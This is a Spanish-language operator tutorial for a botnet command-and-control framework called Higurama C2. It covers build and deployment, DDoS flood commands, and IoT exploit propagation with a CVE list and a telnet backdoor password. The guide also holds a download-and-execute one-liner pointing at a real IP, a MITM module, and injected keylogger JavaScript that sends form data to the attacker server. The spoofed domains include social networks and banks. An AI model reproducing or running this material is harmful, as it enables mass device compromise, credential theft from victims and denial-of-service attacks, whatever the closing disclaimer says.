# 🎮 HIGURAMA C2 v3 - Tutorial Completo de Uso

## 📋 Índice
1. [Instalación y Configuración](#instalación)
2. [Iniciar el C2](#iniciar-c2)
3. [Dashboard y Comandos](#dashboard)
4. [Gestión de Bots](#gestión-bots)
5. [Ataques DDoS](#ataques-ddos)
6. [Exploits y Propagación](#exploits)
7. [Modo Vivi (MITM)](#vivi)
8. [Troubleshooting](#troubleshooting)

---

## 🚀 Instalación y Configuración {#instalación}

### En tu VPS (93.95.231.134):

```bash
# 1. Clonar repositorio
cd /opt
git clone https://github.com/Vixy-beep/higurama.git
cd higurama

# 2. Instalar dependencias
apt update
apt install -y gcc libssl-dev libjson-c-dev libcurl4-openssl-dev libssh-dev musl-tools

# 3. Generar certificados SSL
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/C=DO/ST=SantoDomingo/L=DN/O=Higurama/CN=93.95.231.134"

# 4. Compilar C2 v3 (con animaciones)
gcc -o higurama_v3 c2_master_v3.c -lpthread -lssl -lcrypto -ljson-c -O2

# 5. Compilar bots
gcc -o higurashi higurashi.c -lpthread -lssl -lcrypto -lcurl -ljson-c -lssh -O2
musl-gcc -static -o higurashi_mini higurashi_mini.c -lpthread -O2

# 6. Compilar Vivi (MITM)
gcc -o vivi_v3 bot_vivi_v3.c -lpthread -lssl -lcrypto -ljson-c -O2

# 7. Verificar compilación
ls -lh higurama_v3 higurashi higurashi_mini vivi_v3
```

### Abrir puertos en firewall:

```bash
# Puerto C2 (SSL)
ufw allow 4444/tcp

# Puerto HTTP (payload delivery)
ufw allow 8080/tcp

# Puerto backup
ufw allow 31337/tcp

# Verificar
ufw status
```

---

## 🎯 Iniciar el C2 {#iniciar-c2}

### Modo interactivo (ver dashboard):

```bash
cd /opt/higurama
./higurama_v3
```

**Verás:**
1. ✨ Banner animado con glitch effect (3 frames)
2. 🟢 Loading screen con checkmarks
3. 🎆 Matrix rain effect (1.5 segundos)
4. 📊 Dashboard en tiempo real

### Modo background (daemon):

```bash
# Con nohup
nohup ./higurama_v3 > c2.log 2>&1 &

# O con screen
screen -S c2
./higurama_v3
# Ctrl+A, D para detach

# Reconectar
screen -r c2
```

### Verificar que está corriendo:

```bash
# Ver proceso
ps aux | grep higurama_v3

# Ver puerto escuchando
netstat -tlnp | grep 4444

# Ver logs en tiempo real
tail -f c2.log
```

---

## 📊 Dashboard y Comandos {#dashboard}

### Dashboard principal:

```
╔════════════════════════════════════════════════════════════════════════════════╗
║ HIGURAMA C2 COMMAND & CONTROL v3.0 [CYBERPUNK EDITION]                        ║
╚════════════════════════════════════════════════════════════════════════════════╝

┌─────────────────────────── SYSTEM STATUS ───────────────────────────┐
│ ⚡ Uptime: 02:34:15        📡 Total Connections: 23                 │
│ 💣 Total Attacks: 5        🎯 Exploits Sent: 142                    │
└────────────────────────────────────────────────────────────────────┘

┌────────────────────────── █ 15 BOTS ACTIVOS █ ──────────────────────┐
│ ID          IP Address      Type      Hostname         Last Seen    │
├────────────────────────────────────────────────────────────────────┤
│ bot_a3f91c2 192.168.1.100   full      router-hikvision 5s ago      │
│ bot_7d2e4a1 192.168.1.105   mini      cam-dlink        12s ago     │
│ mob_8f3c1b9 192.168.1.50    mobile    android-rubir    3s ago      │
│ vivi_d9a2e7 192.168.1.10    vivi      mitm-gateway     8s ago      │
└────────────────────────────────────────────────────────────────────┘

╔═══════════════════════════ COMMAND MENU ═══════════════════════════╗
║ [1] List Bots       [2] Scan Network    [3] Launch Attack          ║
║ [4] Send Exploit    [5] Bot Shell       [6] Mass Command           ║
║ [7] Show Stats      [8] Kill Bot        [9] Clear Screen           ║
║ [0] Exit C2         [h] Help            [a] ASCII Art              ║
╚════════════════════════════════════════════════════════════════════╝

Command ►
```

### Panel de estadísticas:

- **⚡ Uptime**: Tiempo desde que inició el C2
- **📡 Total Connections**: Conexiones acumuladas (incluye reconexiones)
- **💣 Total Attacks**: Ataques DDoS lanzados
- **🎯 Exploits Sent**: Intentos de explotación enviados

### Estados de bots:

- 🟢 **Verde** (0-30s): Bot activo y respondiendo
- 🟡 **Amarillo** (30-60s): Bot posiblemente lagueado
- 🔴 **Rojo** (>60s): Bot casi desconectado

---

## 🤖 Gestión de Bots {#gestión-bots}

### Comando [1] - List Bots (Lista detallada)

```
Command ► 1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🤖 ACTIVE BOTS DETAILED LIST
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Bot #1:
  ID: bot_a3f91c2
  IP: 192.168.1.100
  Hostname: router-hikvision
  Type: full
  Architecture: x86_64
  Uptime: 3600 seconds
  Last seen: 5 seconds ago

Bot #2:
  ID: mob_8f3c1b9
  IP: 192.168.1.50
  Hostname: android-rubir
  Type: mobile
  Architecture: aarch64
  Uptime: 7200 seconds
  Last seen: 3 seconds ago

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Tipos de bots:**
- `full`: Bot completo con todas las capacidades (higurashi.c)
- `mini`: Bot ligero para IoT (higurashi_mini.c)
- `mobile`: Bot móvil con WiFi scanning (higurashi_mobile.c)
- `vivi`: Módulo MITM (bot_vivi_v3.c)

### Comando [2] - Scan Network (Escanear red)

```
Command ► 2

🔍 NETWORK SCANNING MODE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Select bot ID to scan from: bot_a3f91c2

✓ Sending scan command to bot_a3f91c2...

[▰▰▰▰▰▰▰▰▰▰] Scanning network...

✓ Scan initiated!
```

**Qué hace:**
- El bot seleccionado escanea su red local (192.168.x.x/24)
- Busca dispositivos vulnerables (telnet, HTTP, SSH)
- Intenta 8 CVE exploits diferentes
- Los resultados se envían de vuelta al C2

### Comando [8] - Kill Bot

```
Command ► 8

Enter bot ID to kill: bot_a3f91c2

✓ Sending kill signal to bot_a3f91c2...
✓ Bot terminated
```

**Cierra el bot remotamente** (útil para limpiar después de pruebas)

---

## 💣 Ataques DDoS {#ataques-ddos}

### Comando [3] - Launch Attack

```
Command ► 3

              _______________
          .-''               ''.
        .'  _____             _____
       /   ( _   )           (   _ )
      /     \_/               \_/
     |       ||                 ||
     |       ||     ATTACK      ||
     |       ||                 ||
      \     /||                 ||
       '---' ||     _____       ||
             ||    (     )      ||
             ||     \___/       ||
             ||      |||        ||
            /__\    // \\      /__\

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💣 ATTACK LAUNCH SYSTEM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Attack types:
  [1] TCP Flood
  [2] UDP Flood
  [3] SYN Flood

Select attack type: 2
Target IP: 192.168.1.1
Port: 53
Duration (seconds): 60

🎯 Launching UDP FLOOD on 192.168.1.1:53 for 60 seconds...

✓ Attack command sent to 15 bots!
```

### Tipos de ataques:

#### 1. TCP Flood
- Envía paquetes TCP completos
- Consume ancho de banda y CPU
- Efectivo contra servidores web

```c
// Parámetros
Target: IP destino
Port: 80, 443, 8080
Duration: 30-300 segundos
Threads: 20 por bot
```

#### 2. UDP Flood
- Paquetes UDP sin respuesta
- Satura el ancho de banda
- Efectivo contra DNS, juegos online

```c
// Parámetros
Target: Router, DNS, servidor
Port: 53, 123, 1194
Duration: 60-600 segundos
Payload: 512-1024 bytes
```

#### 3. SYN Flood
- SYN packets sin completar handshake
- Agota tabla de conexiones
- Más sigiloso que TCP flood

```c
// Parámetros
Target: Cualquier servidor TCP
Port: 22, 80, 443, 3306
Duration: 30-180 segundos
Spoofed IPs: Aleatorios
```

### Potencia de ataque:

```
1 bot mini:     ~50 Mbps
10 bots mini:   ~500 Mbps
50 bots mini:   ~2.5 Gbps
100 bots mini:  ~5 Gbps

Con bots full (más threads): x2-x3 más potencia
```

---

## 🎯 Exploits y Propagación {#exploits}

### Comando [4] - Send Exploit

```
Command ► 4

Available exploits:
  [1] CVE-2017-7921 - Hikvision IP Camera
  [2] CVE-2020-25506 - D-Link Router
  [3] CVE-2013-6117 - Dahua DVR
  [4] CVE-2016-6277 - Netgear Router
  [5] CVE-2017-13772 - TP-Link Router
  [6] CVE-2019-12727 - Ubiquiti EdgeRouter
  [7] CVE-2014-2321 - ZTE Router
  [8] Generic Auth Bypass

Select exploit: 1
Target IP: 192.168.1.100
Bot to use: bot_a3f91c2

✓ Exploit sent!
```

### CVE Exploits implementados:

#### CVE-2017-7921 (Hikvision)
```
Target: Cámaras IP Hikvision
Vector: Auth bypass + command injection
Payload: GET /Security/users?auth=YWRtaW46MTEK
Success rate: ~85%
```

#### CVE-2020-25506 (D-Link)
```
Target: Routers D-Link DIR-865L
Vector: Command injection en system_mgr.cgi
Payload: $(wget http://C2/payload)
Success rate: ~75%
```

#### CVE-2013-6117 (Dahua)
```
Target: DVR Dahua
Vector: Telnet backdoor
Credentials: 888888:7ujMko0admin
Success rate: ~90%
```

### Propagación automática:

Los bots **se replican solos** usando 5 métodos:

1. **wget** (más común)
2. **curl** (fallback)
3. **busybox nc** (IoT devices)
4. **/dev/tcp** (bash builtin)
5. **tftp** (routers viejos)

```bash
# Ejemplo de comando enviado por exploit:
cd /tmp;
wget http://93.95.231.134:8080/higurashi_mini -O h 2>/dev/null||
curl -o h http://93.95.231.134:8080/higurashi_mini 2>/dev/null||
nc 93.95.231.134 8080 < /dev/null > h;
chmod 777 h;
./h 93.95.231.134 4444 &
```

---

## 🕵️ Modo Vivi (MITM) {#vivi}

### ¿Qué es Vivi v3?

**MITM (Man-in-the-Middle) avanzado** con:
- ARP Spoofing bidireccional
- DNS Spoofing (redirects)
- SSL Stripping (HTTPS → HTTP)
- HTTP Injection (JavaScript malicioso)
- Credential harvesting

### Compilar y desplegar Vivi:

```bash
# En VPS
cd /opt/higurama
gcc -o vivi_v3 bot_vivi_v3.c -lpthread -lssl -lcrypto -ljson-c -O2

# Copiar a dispositivo en red local (requiere acceso físico o SSH)
scp vivi_v3 root@192.168.1.10:/tmp/
ssh root@192.168.1.10 "chmod +x /tmp/vivi_v3"
```

### Ejecutar Vivi:

```bash
# En el dispositivo comprometido (debe estar en la misma red que la víctima)
./vivi_v3 192.168.1.50

# O especificando gateway
./vivi_v3 192.168.1.50 192.168.1.1
```

### Output esperado:

```
╔══════════════════════════════════════════════════════════════╗
║         VIVI v3 - Advanced MITM Attack Suite                ║
╠══════════════════════════════════════════════════════════════╣
║ Target:    192.168.1.50                                      ║
║ Gateway:   192.168.1.1                                       ║
║ Interface: eth0                                              ║
║ Our MAC:   00:0c:29:3a:5f:12                                ║
╚══════════════════════════════════════════════════════════════╝

[*] Starting attack modules...

[+] All attack modules active!
[*] ARP Spoofing:      Victim thinks we are the gateway
[*] DNS Spoofing:      Redirecting: Facebook, Instagram, Gmail, Banks
[*] SSL Stripping:     HTTPS -> HTTP downgrade
[*] HTTP Injection:    JavaScript keylogger injected
[*] Credential Logger: Listening on port 9999

[*] Stolen credentials: /tmp/.phished_creds
[*] SSL strips logged: /tmp/.ssl_stripped
[*] Press Ctrl+C to stop

[DNS Spoof] facebook.com -> 93.95.231.134
[PHISHED] Captured credentials from 192.168.1.50
```

### Dominios redirigidos (DNS Spoof):

```c
facebook.com → tu_vps
instagram.com → tu_vps
twitter.com → tu_vps
gmail.com → tu_vps
accounts.google.com → tu_vps
secure.bankpopular.com → tu_vps
www.banreservas.com → tu_vps
```

### JavaScript inyectado:

```javascript
// Se inyecta en TODAS las páginas HTML que visite la víctima
document.addEventListener('DOMContentLoaded', function() {
  // Captura todos los formularios
  var forms = document.getElementsByTagName('form');
  for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
      var data = new FormData(this);
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'http://93.95.231.134:9999/log', true);
      xhr.send(data);  // Envía credenciales ANTES del submit real
    });
  }
  
  // Keylogger en campos password
  if (document.querySelector('[type=password]')) {
    document.querySelectorAll('input').forEach(function(inp) {
      inp.addEventListener('blur', function() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://93.95.231.134:9999/log', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('field=' + this.name + '&value=' + encodeURIComponent(this.value));
      });
    });
  }
});
```

### Ver credenciales capturadas:

```bash
# En VPS
tail -f /tmp/.phished_creds

# Output:
[1733045123] Captured from victim 192.168.1.50:
POST /login HTTP/1.1
username=rubirios@gmail.com&password=MiPassword123&submit=Login

[1733045189] Captured from victim 192.168.1.50:
field=email&value=rubirios@gmail.com
field=password&value=MySecretPass456
```

---

## 📱 Bot Móvil (higurashi_mobile) {#mobile}

### Compilar para Android:

```bash
# En VPS
cd /opt/higurama
gcc -static -o higurashi_mobile higurashi_mobile.c -lpthread -O2

# Servir para descarga
python3 -m http.server 8080
```

### En UserLAnd/Termux:

```bash
# Descargar
wget http://93.95.231.134:8080/higurashi_mobile
chmod +x higurashi_mobile

# Ejecutar
./higurashi_mobile
```

### Capacidades del bot móvil:

1. **WiFi Monitoring**: Detecta cambios de red cada 30s
2. **Auto-scanning**: Escanea automáticamente redes nuevas
3. **P2P Mode**: Funciona sin C2 (peer-to-peer)
4. **WiFi History**: Recuerda redes anteriores
5. **20 threads**: Escaneo paralelo rápido

### Output del bot móvil:

```
╔══════════════════════════════════════════════════════════╗
║     HIGURASHI MOBILE - WiFi Auto-Replication Worm        ║
╚══════════════════════════════════════════════════════════╝
[*] Bot ID: mob_8f3c1b9

╔══════════════════════════════════════════════════════════╗
║           KNOWN WIFI NETWORKS DATABASE                   ║
╠══════════════════════════════════════════════════════════╣
║ Casa_WiFi                      Devices: 12  (2d ago)     ║
║ Trabajo_Oficina                Devices: 45  (1d ago)     ║
║ Universidad_PUCMM              Devices: 156 (5d ago)     ║
╚══════════════════════════════════════════════════════════╝

[*] Current network: Casa_WiFi
[*] Local IP: 192.168.1.50
[*] Performing initial network scan...
[+] Scanning network: 192.168.1.0/24
[+] Scan complete. Found 12 new devices

[*] Connecting to C2: 93.95.231.134:4444
[+] Connected to C2!

[!] WiFi CHANGED: Casa_WiFi -> Universidad_PUCMM
[!] IP: 10.50.2.45
[*] Auto-scanning new network...
[+] Scanning network: 10.50.2.0/24
[+] Scan complete. Found 89 new devices
```

---

## 🔧 Troubleshooting {#troubleshooting}

### C2 no inicia:

```bash
# Error: Address already in use
netstat -tlnp | grep 4444
kill -9 <PID>
./higurama_v3

# Error: SSL certificate not found
ls -la key.pem cert.pem
# Si no existen, regenerar:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=higurama"
```

### Bots no se conectan:

```bash
# Verificar firewall
ufw status
ufw allow 4444/tcp

# Verificar que C2 está escuchando
netstat -tlnp | grep 4444

# Probar conexión desde otro host
telnet 93.95.231.134 4444

# Ver logs de conexión
tail -f c2.log
```

### Payloads no se descargan:

```bash
# Verificar servidor HTTP
python3 -m http.server 8080 &

# Verificar que archivo existe
ls -la higurashi_mini

# Probar descarga manual
wget http://93.95.231.134:8080/higurashi_mini
```

### Ataques no funcionan:

```bash
# Verificar que bots están activos
Command ► 1

# Ver si reciben comandos (en el bot)
tail -f /tmp/.bot_log

# Probar ataque con 1 bot primero
Command ► 3
Select attack type: 2
Target IP: 192.168.1.1
Port: 53
Duration (seconds): 10
```

### Vivi no captura tráfico:

```bash
# Verificar que tiene permisos root
sudo ./vivi_v3 192.168.1.50

# Verificar ARP spoofing
arp -a
# Deberías ver MACs duplicadas

# Verificar forwarding
cat /proc/sys/net/ipv4/ip_forward
# Debe ser 1

# Verificar puerto 9999
netstat -tlnp | grep 9999
```

---

## 📈 Estadísticas y Monitoreo

### Comando [7] - Show Stats

```
Command ► 7

╔════════════════════════════════════════════════════════════╗
║                  HIGURAMA C2 STATISTICS                    ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║  Uptime:              2h 34m 15s                          ║
║  Total Connections:   142                                  ║
║  Active Bots:         15                                   ║
║  Dead Bots:           127                                  ║
║                                                            ║
║  Attacks Launched:    5                                    ║
║    - TCP Flood:       2                                    ║
║    - UDP Flood:       2                                    ║
║    - SYN Flood:       1                                    ║
║                                                            ║
║  Exploits Sent:       142                                  ║
║    - Hikvision:       45                                   ║
║    - D-Link:          38                                   ║
║    - Dahua:           29                                   ║
║    - Generic:         30                                   ║
║                                                            ║
║  Network Traffic:                                          ║
║    - Bytes Sent:      2.3 GB                              ║
║    - Bytes Received:  156 MB                              ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
```

### Logs del sistema:

```bash
# C2 logs
tail -f /opt/higurama/c2.log

# Bot connections
grep "Connected" c2.log

# Attacks
grep "Attack" c2.log

# Exploits
grep "Exploit" c2.log
```

---

## 🎨 Extras

### Comando [a] - ASCII Art

Muestra arte ASCII animado (samurai cyberpunk)

### Comando [9] - Clear Screen

Limpia y refresca el dashboard

### Comando [h] - Help

Muestra ayuda contextual

---

## 💀 Capacidades Totales del Sistema

### Arquitectura completa:

```
VPS (93.95.231.134)
  ├─ C2 Master v3 (puerto 4444) ✅
  ├─ HTTP Server (puerto 8080) ✅
  └─ Credential Logger (puerto 9999) ✅

Bots Disponibles:
  ├─ higurashi (full)
  │   ├─ SSH scanning
  │   ├─ CVE exploits (8 tipos)
  │   ├─ DDoS (3 tipos)
  │   ├─ Auto-replication (5 métodos)
  │   └─ Firmware persistence
  │
  ├─ higurashi_mini (IoT)
  │   ├─ Static binary (46KB)
  │   ├─ DDoS simplificado
  │   ├─ Basic persistence
  │   └─ Sin dependencias
  │
  ├─ higurashi_mobile (Android)
  │   ├─ WiFi auto-detection
  │   ├─ Network history tracking
  │   ├─ P2P mode
  │   └─ 20-thread scanning
  │
  └─ vivi_v3 (MITM)
      ├─ ARP spoofing
      ├─ DNS spoofing
      ├─ SSL stripping
      ├─ HTTP injection
      └─ Credential harvesting
```

### Capacidad de ataque estimada:

```
10 bots:      500 Mbps  → Tira router doméstico
50 bots:      2.5 Gbps  → Tira servidor pequeño
100 bots:     5 Gbps    → Tira sitio web mediano
500 bots:     25 Gbps   → Tira infraestructura enterprise
1000+ bots:   50+ Gbps  → Requiere mitigación CDN/DDoS
```

### Vectores de infección:

1. **Telnet** (puerto 23, 2323): 9 pares de credenciales
2. **HTTP** (puerto 80, 8080): 8 CVE exploits
3. **SSH** (puerto 22): Brute force con diccionario
4. **MITM**: Vivi en red local
5. **WiFi**: Mobile bot auto-scanning

---

## 🎯 Escenarios de Uso

### Escenario 1: Red doméstica

```bash
# 1. Infectar router
./higurashi 93.95.231.134 4444

# 2. Desde router, escanear red
Command ► 2
Select bot: bot_xxxxx

# 3. Infectar dispositivos encontrados
Command ► 4
Select exploit: 1 (Hikvision)

# 4. Desplegar Vivi en gateway
./vivi_v3 192.168.1.100
```

### Escenario 2: Universidad/Empresa

```bash
# 1. Bot móvil en tu cel
./higurashi_mobile

# 2. Caminar por edificios (WiFi auto-scan)
# El bot detecta cada red nueva y escanea

# 3. Ver estadísticas de redes
[*] Universidad_PUCMM: 156 devices found
[*] Biblioteca_WiFi: 89 devices found
[*] Lab_Sistemas: 34 devices found
```

### Escenario 3: Ataque DDoS coordinado

```bash
# 1. Esperar a tener 50+ bots
Command ► 1

# 2. Lanzar ataque masivo
Command ► 3
Attack type: 2 (UDP Flood)
Target: 192.168.1.1
Port: 53
Duration: 300

# 3. Monitorear
Command ► 7
```

---

## ⚠️ Disclaimer Legal

Este sistema es para **investigación educativa** y **pruebas de seguridad autorizadas** únicamente.

**PROHIBIDO:**
- Atacar sistemas sin permiso escrito
- Desplegar en redes públicas sin autorización
- Usar para fines ilegales o maliciosos

**PERMITIDO:**
- Laboratorio personal (Docker containers)
- Tesis universitaria con supervisión
- Penetration testing autorizado
- CTF competitions

---

## 📚 Referencias

- C2 Framework: `c2_master_v3.c`
- Bot completo: `higurashi.c`
- Bot IoT: `higurashi_mini.c`
- Bot móvil: `higurashi_mobile.c`
- MITM: `bot_vivi_v3.c`
- Exploits: `exploit_db.h`
- Config: `config.h`

**Repositorio**: https://github.com/Vixy-beep/higurama

---

¡Ahora tienes control total del sistema! 🔥🚀
